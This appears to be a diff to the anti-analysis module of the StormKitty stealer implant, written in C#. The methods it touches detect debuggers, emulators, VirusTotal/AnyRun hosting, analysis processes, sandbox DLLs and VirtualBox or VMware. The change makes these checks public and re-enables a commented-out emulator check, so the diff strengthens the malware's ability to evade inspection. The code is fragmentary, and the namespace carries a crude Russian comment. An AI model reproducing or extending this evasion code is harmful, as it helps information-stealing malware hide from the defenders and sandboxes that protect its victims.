@@ -21,7 +21,7 @@ namespace StormKitty.Implant // Анальный
         /// <summary>
         /// Returns true if the file is running in debugger; otherwise returns false
         /// </summary>
-        private static bool Debugger()
+        public static bool Debugger()
         {
             bool isDebuggerPresent = false;
             try
@@ -35,7 +35,7 @@ namespace StormKitty.Implant // Анальный
         /// <summary>
         /// Returns true if the file is running in emulator; otherwise returns false
         /// </summary>
-        /*private static bool Emulator()
+        public static bool Emulator()
         {
             try
             {
@@ -46,12 +46,12 @@ namespace StormKitty.Implant // Анальный
             }
             catch { }
             return false;
-        }*/
+        }
 
         /// <summary>
         /// Returns true if the file is running on the server (VirusTotal, AnyRun); otherwise returns false
         /// </summary>
-        private static bool Hosting()
+        public static bool Hosting()
         {
             try
             {
@@ -66,7 +66,7 @@ namespace StormKitty.Implant // Анальный
         /// <summary>
         /// Returns true if a process is started from the list; otherwise, returns false
         /// </summary>
-        private static bool Processes()
+        public static bool Processes()
         {
             Process[] running_process_list = Process.GetProcesses();
             string[] selected_process_list = new string[] {
@@ -83,7 +83,7 @@ namespace StormKitty.Implant // Анальный
         /// <summary>
         /// Returns true if the file is running in sandbox; otherwise returns false
         /// </summary>
-        private static bool SandBox()
+        public static bool SandBox()
         {
             string[] dlls = new string[5]
             {
@@ -102,7 +102,7 @@ namespace StormKitty.Implant // Анальный
         /// <summary>
         /// Returns true if the file is running in VirtualBox or VmWare; otherwise returns false
         /// </summary>
-        private static bool VirtualBox()
+        public static bool VirtualBox()
         {
             using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
                 try
